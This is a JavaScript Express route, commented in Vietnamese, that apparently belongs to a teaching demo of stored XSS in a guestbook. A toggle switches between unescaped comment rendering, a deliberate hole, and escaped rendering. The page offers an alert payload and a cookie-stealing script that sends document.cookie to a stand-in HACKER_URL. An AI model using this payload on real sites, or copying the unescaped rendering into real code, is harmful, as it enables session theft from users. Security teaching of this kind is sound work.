// stored.js - Demo Stored XSS (sổ lưu bút) + kịch bản đánh cắp cookie
const express = require('express');
const router = express.Router();
const { layout, escapeHtml } = require('../render');
const { isSafe, addComment, getComments, HACKER_URL } = require('../store');

router.get('/stored', (req, res) => {
  const safe = isSafe();

  // Dựng lại HTML cho danh sách bình luận
  const commentsHtml = getComments().map((c) => {
    if (safe) {
      // PHÒNG THỦ: escape cả tên lẫn nội dung khi render
      return `<div class="comment"><div class="who">${escapeHtml(c.name)}</div>
        <div class="body">${escapeHtml(c.body)}</div></div>`;
    }
    // LỖ HỔNG: in nội dung bình luận nguyên văn -> script đã lưu sẽ chạy với mọi người xem
    return `<div class="comment"><div class="who">${c.name}</div>
      <div class="body">${c.body}</div></div>`;
  }).join('');

  // Payload đánh cắp cookie: gửi document.cookie về server của hacker
  const stealPayload =
    `<script>new Image().src='${HACKER_URL}/steal?c='+encodeURIComponent(document.cookie)</script>`;

  const modeTag = safe ? '<span class="pill safe">AN TOÀN</span>' : '<span class="pill vuln">CÓ LỖ HỔNG</span>';

  const body = `
  <div class="card">
    <h1>💾 Stored XSS — Sổ lưu bút ${modeTag}</h1>
    <p class="lead">Bình luận được <strong>lưu lại trên máy chủ</strong>. Ở chế độ CÓ LỖ HỔNG, nội dung
    bình luận được in nguyên văn nên script trong bình luận sẽ chạy với <em>mọi người</em> mở trang này —
    kể cả những lần tải trang về sau.</p>

    <form method="POST" action="/stored">
      <label for="name">Tên</label>
      <input type="text" id="name" name="name" placeholder="Tên của bạn">
      <label for="body">Nội dung</label>
      <textarea id="body" name="body" placeholder="Viết gì đó..."></textarea>
      <button class="btn" type="submit">💬 Gửi bình luận</button>
    </form>
  </div>

  <div class="card">
    <h2>Các bình luận</h2>
    ${commentsHtml || '<p class="lead">Chưa có bình luận nào.</p>'}
  </div>

  <div class="card">
    <h2>Payload thử nghiệm</h2>
    <p><strong>1)</strong> Payload đơn giản chứng minh script chạy:</p>
    <pre id="p1">${escapeHtml("<script>alert('Stored XSS')</script>")}</pre>
    <button class="btn ghost" onclick="copyText('p1', this)">📋 Sao chép</button>

    <p style="margin-top:22px"><strong>2)</strong> <span class="danger">Payload đánh cắp cookie</span> —
    gửi cookie phiên của nạn nhân về “server của hacker” (<code>${HACKER_URL}</code>):</p>
    <pre id="p2">${escapeHtml(stealPayload)}</pre>
    <button class="btn ghost" onclick="copyText('p2', this)">📋 Sao chép</button>

    <div class="hint">
      Gửi payload <b>(2)</b> khi đang ở chế độ CÓ LỖ HỔNG, rồi mở <code>${HACKER_URL}</code> để thấy cookie bị trộm.
      Sau đó chuyển sang AN TOÀN và tải lại trang: cookie HttpOnly + CSP + escape sẽ chặn payload hoạt động.
    </div>
  </div>`;
  res.send(layout('Stored XSS', body));
});

router.post('/stored', (req, res) => {
  addComment(req.body.name, req.body.body);
  res.redirect('/stored');
});

module.exports = router;
